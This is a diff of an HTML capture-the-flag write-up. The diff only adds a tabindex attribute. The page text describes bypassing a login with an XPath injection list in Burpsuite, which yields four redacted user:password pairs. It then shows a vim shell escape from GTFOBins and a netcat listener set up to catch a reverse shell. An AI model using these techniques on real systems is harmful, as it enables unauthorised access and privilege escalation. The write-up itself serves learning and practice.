@@ -256,7 +256,7 @@ by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f9
 <p>Therefore I used <code>Burpsuite</code> to exploit this with <a href=XPATH_list.txt>this list</a> to check if I can exploit it :)</p>
 <p><img src=info_1.png alt=info_1></p>
 <p>Checking the length of the responses, one of them was different, and we bypass the check and now we got a set of 4 users:password</p>
-<pre><code>Username Password
+<pre tabindex=0><code>Username Password
 Tove [REDACTED]
 Godzilla [REDACTED]
 SuperMan [REDACTED]
@@ -359,7 +359,7 @@ ideaBox
 </code></pre></div><p>Wow! It&rsquo;s giving us options to select!</p>
 <p>Trying with every option, I figured out that the option 4 opens a <code>vim</code> editor, so I can exploit that!</p>
 <p>With the following code from <a href=https://gtfobins.github.io/gtfobins/vim/>GTFOBins</a>:</p>
-<pre><code>vim
+<pre tabindex=0><code>vim
 :set shell=/bin/sh #I used bash :p
 :shell
 </code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ArthurMorgan@incognito:~$ nc -nlvp <span style=color:#ae81ff>4545</span>
